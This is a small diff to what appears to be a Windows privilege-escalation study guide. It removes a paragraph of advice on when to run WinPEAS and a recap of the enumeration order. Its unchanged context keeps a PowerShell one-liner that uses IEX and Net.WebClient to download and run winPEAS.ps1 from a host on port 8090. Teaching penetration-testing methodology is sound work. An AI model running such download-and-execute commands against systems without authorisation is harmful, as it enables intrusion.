@@ -307,10 +307,6 @@ BUILTIN\Users:(I)(RX)
 powershell "IEX(New-Object Net.WebClient).downloadString('http://<local ip>:8090/winPEASS.ps1')" > winpeas.txt
 ```
 
-Run this **after** manual enumeration — good for catching what you missed, but relying on it first skips the reasoning practice (useful for CJCA/GCIH/CPTS-style methodology building).
-
-**Suggested flow recap:** `whoami /priv` + `/groups` → user/group enum → system/OS enum → processes/tasks → scheduled tasks → network → execution policy → file permissions → WinPEAS as a final sweep.
-
 **Step 8 — Final Enumeration**
 Via `services.msc`, identify for each service:
 
